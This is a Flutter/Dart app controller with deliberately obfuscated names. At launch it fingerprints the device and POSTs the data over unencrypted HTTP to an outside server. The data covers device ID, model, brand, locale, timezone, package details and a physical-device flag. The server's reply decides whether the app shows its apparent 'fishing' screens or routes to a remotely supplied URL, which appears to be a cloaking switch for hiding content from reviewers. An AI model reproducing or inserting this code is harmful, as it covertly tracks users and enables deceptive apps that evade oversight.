import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class PageLogic extends GetxController {

  var tuerbpos = RxBool(false);
  var mhbfjtuokw = RxBool(true);
  var mdsk = RxString("");
  var maddison = RxBool(false);
  var casper = RxBool(true);
  final voijelgd = Dio();


  InAppWebViewController? webViewController;

  dynamic edsgcajrzi(){
    final iwfrzqmuvj = InternetConnectionChecker.instance;
    final khtzejny = iwfrzqmuvj.onStatusChange.skip(1).listen(
          (InternetConnectionStatus imqctxj) {
        if (imqctxj == InternetConnectionStatus.connected) {
          qrxya();
        } else {
          Get.toNamed('/sad')?.then((_){
            qrxya();
          });
        }
      },
    );
    return khtzejny;
  }

  Future<bool> gutrisyz() async {
    final bool jsdihon = await InternetConnectionChecker.instance.hasConnection;
    if(!jsdihon){
      Get.toNamed('/sad')?.then((_){
        qrxya();
      });
    }
    return jsdihon;
  }

  @override
  void onInit() {
    super.onInit();
    edsgcajrzi();
    qrxya();
  }


  Future<void> qrxya() async {

    var kqymzgio = await gutrisyz();
    if(!kqymzgio){
      return;
    }

    maddison.value = true;
    casper.value = true;
    mhbfjtuokw.value = false;

    voijelgd.post("http://bid.zailormin.com/bXWBfbh",data: await fnstmd()).then((value) {
      var jcwykren = value.data["jcwykren"] as String;
      var hoajgkl = value.data["hoajgkl"] as bool;
      if (hoajgkl) {
        mdsk.value = jcwykren;
        narciso();
      } else {
        kohler();
      }
    }).catchError((e) {
      mhbfjtuokw.value = true;
      casper.value = true;
      maddison.value = false;
    });
  }

  Future<Map<String, dynamic>> fnstmd() async {
    final DeviceInfoPlugin nclvgz = DeviceInfoPlugin();
    PackageInfo glhqfwbv_dqtx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var xqtgkl = Platform.localeName;
    var RiThKMA = currentTimeZone;

    var pHTfRb = glhqfwbv_dqtx.packageName;
    var eXLMWCA = glhqfwbv_dqtx.version;
    var dBCxvn = glhqfwbv_dqtx.buildNumber;

    var JSdtXKH = glhqfwbv_dqtx.appName;
    var VBmLcIl = "";
    var OhcY  = "";
    var YRZxl = "";
    var kurtisWard = "";
    var dorotheaHand = "";
    var emelyStark = "";
    var wallaceOsinski = "";
    var mathiasLakin = "";
    var marieMcLaughlin = "";


    var lRyY = "";
    var HRLjCdKO = false;

    if (GetPlatform.isAndroid) {
      lRyY = "android";
      var nilzocwdrg = await nclvgz.androidInfo;

      YRZxl = nilzocwdrg.brand;

      VBmLcIl  = nilzocwdrg.model;
      OhcY = nilzocwdrg.id;

      HRLjCdKO = nilzocwdrg.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lRyY = "ios";
      var bkczwyxe = await nclvgz.iosInfo;
      YRZxl = bkczwyxe.name;
      VBmLcIl = bkczwyxe.model;

      OhcY = bkczwyxe.identifierForVendor ?? "";
      HRLjCdKO  = bkczwyxe.isPhysicalDevice;
    }
    var res = {
      "JSdtXKH": JSdtXKH,
      "dBCxvn": dBCxvn,
      "pHTfRb": pHTfRb,
      "marieMcLaughlin" : marieMcLaughlin,
      "VBmLcIl": VBmLcIl,
      "emelyStark" : emelyStark,
      "RiThKMA": RiThKMA,
      "YRZxl": YRZxl,
      "xqtgkl": xqtgkl,
      "lRyY": lRyY,
      "HRLjCdKO": HRLjCdKO,
      "kurtisWard" : kurtisWard,
      "OhcY": OhcY,
      "dorotheaHand" : dorotheaHand,
      "wallaceOsinski" : wallaceOsinski,
      "eXLMWCA": eXLMWCA,
      "mathiasLakin" : mathiasLakin,

    };
    return res;
  }

  Future<void> kohler() async {
    Get.toNamed("/fishingTab");
  }

  Future<void> narciso() async {
    Get.offAllNamed("/fishingBind");
  }

  @override
  void dispose() {
    edsgcajrzi().cancel();
    super.dispose();
  }

}
